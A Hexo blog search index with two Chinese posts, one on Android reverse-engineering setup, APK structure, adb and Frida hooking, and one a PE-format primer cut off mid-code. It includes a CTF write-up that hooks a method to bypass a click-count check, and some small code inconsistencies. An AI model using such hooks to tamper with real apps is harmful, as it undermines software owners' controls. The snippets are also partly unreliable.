<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Android-1</title>
    <url>/2023/10/08/Android-1/</url>
    <content><![CDATA[<blockquote>
<p>不该点开那一篇推文。</p>
</blockquote>
<span id="more"></span>

<ul>
<li>腾讯玄武实验室一篇关于ARM 的文章</li>
</ul>
<p><a href="https://8ksec.io/arm64-reversing-and-exploitation-part-7-bypassing-aslr-and-nx/">ARM64 Reversing And Exploitation Part 7 – Bypassing ASLR and NX - 8kSec</a></p>
<p>但是看完了这篇文章，突然想学一学安卓安全相关的内容</p>
<h2 id="Android-环境搭建"><a href="#Android-环境搭建" class="headerlink" title="Android 环境搭建"></a>Android 环境搭建</h2><h3 id="SDK"><a href="#SDK" class="headerlink" title="SDK"></a>SDK</h3><ul>
<li>在windows 和 Linux 下搭建。比较简单的方式：使用Android Studio</li>
</ul>
<ol>
<li>下载 Java，配置环境变量。</li>
</ol>
<p>Linux 使用包管理器进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># linux</span></span><br><span class="line">sudo apt install openjdk-17-jdk</span><br></pre></td></tr></table></figure>

<p>windows 下在oracle下载 <a href="https://www.oracle.com/java/technologies/downloads/">Java Downloads | Oracle</a>，然后配置</p>
<ol start="2">
<li>下载android studio，使用<a href="https://www.jetbrains.com/zh-cn/lp/toolbox/">JetBrains Toolbox</a></li>
<li>下载 Android SDK，Android studio 打开后如果没有sdk会自行下载，但是有墙，不一定会下载成功，但是总有解决问题的方法（</li>
<li>path: 下载sdk后，将 <code>xxx\platform-tools</code> 加入环境变量，就可以使用adb。翻翻下载的目录，可能有其余有趣的工具，比如qemu</li>
</ol>
<h3 id="运行apk"><a href="#运行apk" class="headerlink" title="运行apk"></a>运行apk</h3><ol>
<li>模拟器</li>
</ol>
<ul>
<li>在安装 WSL2 后导致大部分模拟器不能使用，可以安装WSA，但是万一存在 恶意软件 就会很难搞</li>
</ul>
<p><a href="https://www.bluestacks.cn/">BlueStacks安卓模拟器</a>，配置后，以<strong>管理员运行</strong>，不会失败</p>
<ul>
<li>root：我在修改了配置文件后就成功了。<a href="https://appuals.com/root-bluestacks/">How to Root Bluestacks on Windows Easily?</a></li>
</ul>
<p>但是现在存在对应的选项，只需要在设置里面勾选一下就行。</p>
<ol>
<li>root 真机，这个才是最好的方法。<del>但是买不起</del></li>
</ol>
<ul>
<li>推荐，因为有的不给出x86的lib库</li>
<li>可以在平台买个二手的手机</li>
</ul>
<h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><ul>
<li><a href="https://github.com/skylot/jadx">jadx</a></li>
<li><a href="https://www.pnfsoftware.com/jeb/">JEB Decompiler</a></li>
<li><a href="https://hex-rays.com/IDA-pro/">IDA Pro</a></li>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">ghidra</a></li>
</ul>
<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><ul>
<li><a href="https://pypi.org/project/frida-tools/">frida-tools</a></li>
<li><a href="https://github.com/frida/frida/releases">firda server</a></li>
</ul>
<h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><h2 id="APK结构"><a href="#APK结构" class="headerlink" title="APK结构"></a>APK结构</h2><ul>
<li>APK, 本质上是一个zip文件，我们可以修改文件后缀然后解压。</li>
</ul>
<h3 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h3><p>用于存放需要打包到APK中的静态文件</p>
<p>assets目录<strong>支持任意深度的子目录</strong>，用户可以根据自己的需求任意部署文件夹架构。</p>
<h3 id="META-INF"><a href="#META-INF" class="headerlink" title="META-INF"></a>META-INF</h3><p>存放的是签名信息，用来保证apk包的完整性和系统的安全。</p>
<p>在编译生成一个apk包时，会对所有要打包的文件做一个校验计算，并把计算结果放在META-INF目录下。在安装时，如果校验结果与META-INF下的内容不一致，系统就不会安装这个apk。从而保证了apk包里的文件不能被随意替换。</p>
<p>META-INF目录下包含的文件有CERT.RSA，CERT.DSA，CERT.SF和MANIFEST.MF</p>
<ul>
<li>CERT.RSA：是开发者利用私钥对APK进行签名的签名文件</li>
<li>CERT.SF，MANIFEST.MF：记录了文件中文件的哈希值</li>
</ul>
<h3 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h3><p>这里存放应用程序依赖的<strong>native库文件</strong>，一般是用C&#x2F;C++编写，这里的lib库可能包含多种不同类型，大体可以分为ARM，X86等架构。</p>
<h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><p>res是resource的缩写，这个目录存放资源文件，存在这个文件夹下的所有文件都会映射到Android工程的<code>.R</code>文件中，生成对应的ID，访问的时候直接使用资源ID即R.id.filename，res文件夹下可以包含多个文件夹。</p>
<p><strong>res文件夹，存放的也是资源文件，与assets文件夹不同的是，这里是编译后的资源文件。</strong></p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>是Android应用程序的配置文件，是一个用来描述Android应用“整体资讯”的设定文件， Android系统可以根据这个<strong>自我介绍</strong>完整地了解APK应用程序的资讯，每个Android应用程序都必须包含一个AndroidManifest.xml文件，且它的名字是固定的，不能修改。我们在开发Android应用程序的时候，一般都把代码中的每一个Activity，Service，Provider和Receiver在AndroidManifest.xml中注册，只有这样系统才能启动对应的组件，另外这个文件还包含一些权限声明以及使用的SDK版本信息等等。程序打包时，会把AndroidManifest.xml进行简单的编译，便于Android系统识别，编译之后的格式是AXML格式</p>
<h3 id="classes-dex"><a href="#classes-dex" class="headerlink" title="classes.dex"></a>classes.dex</h3><p>传统的Java程序，首先先把Java文件编译成class文件，字节码都保存在了class文件中，Java虚拟机可以通过解释执行这些class文件。</p>
<p>而Dalvik虚拟机是在Java虚拟机进行了优化，执行的是Dalvik字节码，而这些Dalvik字节码是由Java字节码转换而来，一般情况下，Android应用在打包时通过AndroidSDK中的dx工具将Java字节码转换为Dalvik字节码。dx工具可以对多个class文件进行合并，重组，优化，可以达到减小体积，缩短运行时间的目的。</p>
<p>dx工具把每个.class文件的每个区域的内容进行去重，重组，优化重排后生成dex文件，生成的dex文件可以在Dalvik虚拟机执行，且速度比较快</p>
<h3 id="resources-arsc"><a href="#resources-arsc" class="headerlink" title="resources.arsc"></a>resources.arsc</h3><p>用来记录资源文件和资源ID之间的映射关系，用来根据资源ID寻找资源。Android的开发是分模块的，res目录专门用来存放资源文件，当在代码中需要调用资源文件时，只需要调用findviewbyId()就可以得到资源文件，每当在res文件夹下放一个文件，aapt就会自动生成对应的ID保存在.R文件，我们调用这个ID就可以，但是只有这个ID还不够，.R文件只是保证编译程序不报错，实际上在程序运行时，系统要根据ID去寻找对应的资源路径，而resources.arsc文件就是用来记录这些ID和资源文件位置对应关系的文件。</p>
<h3 id="kotlin"><a href="#kotlin" class="headerlink" title="kotlin"></a>kotlin</h3><p>kotlin 是一门编程语言，也可以直接运行在Java虚拟机中，这个目录存放kotlin资源</p>
<h2 id="adb-简单使用"><a href="#adb-简单使用" class="headerlink" title="adb 简单使用"></a>adb 简单使用</h2><ul>
<li>将文件放入android机器里</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push xxx /data/local/tmp</span><br></pre></td></tr></table></figure>

<ul>
<li>安装应用</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb install apk.apk</span><br></pre></td></tr></table></figure>

<ul>
<li>卸载</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb uninstall com.xxx.xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>获得shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb connect &lt;ip&gt;:&lt;port&gt;</span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">adb disconnect &lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动指定的activity</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">am start -n &lt;package&gt;/&lt;activity&gt; </span><br></pre></td></tr></table></figure>

<h2 id="frida-简单使用"><a href="#frida-简单使用" class="headerlink" title="frida 简单使用"></a>frida 简单使用</h2><ul>
<li><p>python 的 frida-tools 和 手机端的 server 必须保持一致的版本, 可以使用python venv</p>
</li>
<li><p>CPU 信息</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<ul>
<li>指向hook 脚本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida -U -l hook.js -f com.package.name --no-pause</span><br></pre></td></tr></table></figure>

<ul>
<li>使用python 执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># frida-ps -Ua 获得一个pid号</span></span><br><span class="line">process = device.attach(<span class="number">8189</span>)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;hook.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send js</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    jscode = f.readall()</span><br><span class="line">    hook = process.create_script(jscode)</span><br><span class="line">hook.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()  <span class="comment"># 可以操作Android软件并且进行hook</span></span><br></pre></td></tr></table></figure>

<h3 id="hook-java"><a href="#hook-java" class="headerlink" title="hook java"></a>hook java</h3><ul>
<li>框架</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Java.perform(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>获得类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">stringClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.util.String&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>实例化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个实例</span></span><br><span class="line">stringClass.$<span class="keyword">new</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们也可以查找一个实例</span></span><br><span class="line">Java.choose(<span class="string">&#x27;java.lang.String&#x27;</span>, &#123;  </span><br><span class="line">        onMatch: function(instance)&#123;  </span><br><span class="line">	        console.log(<span class="string">&#x27;String instance is:&#x27;</span>, instance);  </span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: function()&#123;</span><br><span class="line">	        console.log(<span class="string">&#x27;search complete!&#x27;</span>);</span><br><span class="line">	    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<ul>
<li>方法</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态方法</span></span><br><span class="line">className.&lt;method&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例方法</span></span><br><span class="line"><span class="comment">// 1. 查找实例调用</span></span><br><span class="line"><span class="comment">// 2. new一个然后调用</span></span><br></pre></td></tr></table></figure>

<ul>
<li>变量</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">&lt;class&gt;.&lt;<span class="keyword">var</span>&gt;.value = xxx;</span><br></pre></td></tr></table></figure>

<ul>
<li>hook java method</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;class&gt;.&lt;method&gt;.implementation = function(arg...) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重载: 当一个 class 两个名称相同的方法</span></span><br><span class="line">&lt;class&gt;.&lt;method&gt;.overload([TYPE], [TYPE]).implementation = function(args...)&#123; </span><br><span class="line">	<span class="comment">// do sth </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数的 hook $init</span></span><br><span class="line">StringBuilder.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = function (arg) &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">partial</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.$init(arg);</span><br><span class="line">    <span class="keyword">if</span> (arg !== <span class="literal">null</span>) &#123;</span><br><span class="line">         partial = arg.toString().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).slice(<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(&#x27;new StringBuilder(java.lang.String); =&gt; &#x27; + result)</span></span><br><span class="line">    console.log(<span class="string">&#x27;new StringBuilder(&quot;&#x27;</span> + partial + <span class="string">&#x27;&quot;);&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="入门例子"><a href="#入门例子" class="headerlink" title="入门例子"></a>入门例子</h2><h3 id="newstartCTF-2023-lazyactivity"><a href="#newstartCTF-2023-lazyactivity" class="headerlink" title="newstartCTF 2023 lazyactivity"></a>newstartCTF 2023 lazyactivity</h3><p>两个activity</p>
<ul>
<li>MainActivity</li>
<li>FlagActivity</li>
</ul>
<p>模拟器打开时是MainActivity，但是我们需要运行FlagActivity</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivit</span><br></pre></td></tr></table></figure>

<p>FlagActivity 逻辑：点击10000次，但是我们可以hook <code>access$004</code> 使其返回结果大于10000就行(原来的逻辑为点击一次，cnt+&#x3D;1, hook后就是点击一次，返回10001)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="type">int</span> access$<span class="number">004</span>(FlagActivity flagActivity) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> flagActivity.cnt + <span class="number">1</span>;</span><br><span class="line">        flagActivity.cnt = i;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(C0535R.layout.layout_2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(C0535R.C0538id.textView2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(C0535R.C0538id.editTextTextPersonName2);</span><br><span class="line">        ((Button) findViewById(C0535R.C0538id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.droidlearn.activity_travel.FlagActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>是男人就点击10000次（bushi</del></p>
<ul>
<li>hook.py</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># 连接安卓机上的frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">3157</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载hooook.js脚本</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lazy_activity.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>

<ul>
<li>hook.js</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">    <span class="comment">//定位类</span></span><br><span class="line">    <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">    <span class="comment">//在这里更改类的方法的实现（implementation）</span></span><br><span class="line">    my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">        <span class="comment">//打印替换前的参数</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<ul>
<li>运行python脚本，然后在模拟器或者真机上点击一下就行。</li>
</ul>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 逆向</title>
    <url>/2024/01/19/C++%20%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<blockquote>
<p>什么？对象，虚？</p>
</blockquote>
<span id="more"></span>

<h2 id="PE-文件格式"><a href="#PE-文件格式" class="headerlink" title="PE 文件格式"></a>PE 文件格式</h2><blockquote>
<p>为什么会有这个？逆向为什么没有这个！</p>
</blockquote>
<p>微软官方文档：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">PE 格式 - Win32 apps</a></p>
<p>使用 010editor 查看。需要先下载插件：模板-&gt;模板库-&gt;安装 exe.bt 。alt+4 可以查看PE文件格式</p>
<h3 id="DOS-头"><a href="#DOS-头" class="headerlink" title="DOS 头"></a>DOS 头</h3><p>两个重要的变量 <code>e_magic</code>(判断是否为DOS头，固定为<code>5a4d</code>) 和 <code>e_lfanew</code>(NT头的偏移) </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER</span><br></pre></td></tr></table></figure>

<h3 id="DOS-stub"><a href="#DOS-stub" class="headerlink" title="DOS stub"></a>DOS stub</h3><p>MS-DOS 存根是在 <em>MS-DOS 下运行的有效应用程序</em>。 它放置在 EXE 映像的前面。 链接器在此处放置一个默认存根，当映像在 MS-DOS 中运行时，该存根输出消息“此程序无法在 DOS 模式下运行”。</p>
<h3 id="NT-头"><a href="#NT-头" class="headerlink" title="NT 头"></a>NT 头</h3><p><code>IMAGE_NT_HEADERS</code> 结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS64</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure>

<h4 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h4><p>签名是一个固定的值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_SIGNATURE                  0x00004550  <span class="comment">// PE00</span></span></span><br></pre></td></tr></table></figure>

<h4 id="FileHeader"><a href="#FileHeader" class="headerlink" title="FileHeader"></a>FileHeader</h4><p>文件头包含了很多重要的属性</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">	WORD    Machine;					<span class="comment">// 取决于机器，ARM, x86...</span></span><br><span class="line">	WORD    NumberOfSections;			<span class="comment">// Section 数量</span></span><br><span class="line">	DWORD   TimeDateStamp;				<span class="comment">// 文件创建时间</span></span><br><span class="line">	DWORD   PointerToSymbolTable;		<span class="comment">// 指向符号表</span></span><br><span class="line">	DWORD   NumberOfSymbols;			<span class="comment">// 符号表中符号个数</span></span><br><span class="line">	WORD    SizeOfOptionalHeader;		<span class="comment">// 可选头的大小</span></span><br><span class="line">	WORD    Characteristics;			<span class="comment">// 文件属性，是否为DLL等</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, * PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<h4 id="OptionalHeader"><a href="#OptionalHeader" class="headerlink" title="OptionalHeader"></a>OptionalHeader</h4><p>可选头</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br><span class="line">    WORD        Magic;                      <span class="comment">// 魔术字</span></span><br><span class="line">    BYTE        MajorLinkerVersion;         <span class="comment">// linker 版本号</span></span><br><span class="line">    BYTE        MinorLinkerVersion;     </span><br><span class="line">    DWORD       SizeOfCode;                </span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;        <span class="comment">// 程序执行入口RVA</span></span><br><span class="line">    DWORD       BaseOfCode;                 <span class="comment">// 代码的节的起始RVA</span></span><br><span class="line">    ULONGLONG   ImageBase;                  <span class="comment">// 优先装载地址</span></span><br><span class="line">    DWORD       SectionAlignment;           <span class="comment">// 内存中的节的对齐</span></span><br><span class="line">    DWORD       FileAlignment;              <span class="comment">// 文件中的节的对齐</span></span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;         <span class="comment">// DLL文件特性</span></span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;                <span class="comment">// 与调试有关</span></span><br><span class="line">    DWORD       NumberOfRvaAndSizes;        <span class="comment">// 数据目录结构的项目数量</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, * PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<p>ImageBase: 文件在内存中的首选装入地址。如果有可能（也就是说，目前如果没有其他占据这块地址，它是正确对齐的并且是一个合法的地址，等等），加载器试图在这个地址装入PE文件。如果可执行文件是在这个地址装入的，那么加载器将跳过应用<em>基址重定位</em>的步骤。</p>
<h3 id="Section"><a href="#Section" class="headerlink" title="Section"></a>Section</h3><p>节的初始化数据由简单的字节块组成。 但是，对于全部为零的节，不需要包含节数据。</p>
<p>每个节的数据位于节头中的 PointerToRawData 字段给出的文件偏移量处。 文件中此数据的大小由 SizeOfRawData 字段指示。 如果 SizeOfRawData 小于 VirtualSize，则其余部分用零填充。</p>
<p>这里的对齐和可选头的 <code>SectionAlignment</code>和 <code>FileAlignment</code> 相关</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">	BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];          <span class="comment">// 名称 .text .bss 等</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		DWORD   PhysicalAddress;</span><br><span class="line">		DWORD   VirtualSize;</span><br><span class="line">	&#125; Misc;</span><br><span class="line">	DWORD   VirtualAddress;                         <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">	DWORD   SizeOfRawData;                          <span class="comment">// 文件对齐后的大小</span></span><br><span class="line">	DWORD   PointerToRawData;                       <span class="comment">// FOA</span></span><br><span class="line">	DWORD   PointerToRelocations;</span><br><span class="line">	DWORD   PointerToLinenumbers;</span><br><span class="line">	WORD    NumberOfRelocations;</span><br><span class="line">	WORD    NumberOfLinenumbers;</span><br><span class="line">	DWORD   Characteristics;                        <span class="comment">// 节属性如可读，可写，可执行等</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, * PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>非常简单的源码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d, <span class="type">int</span> e, <span class="type">int</span> f, <span class="type">int</span> g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	std::cout &lt;&lt; <span 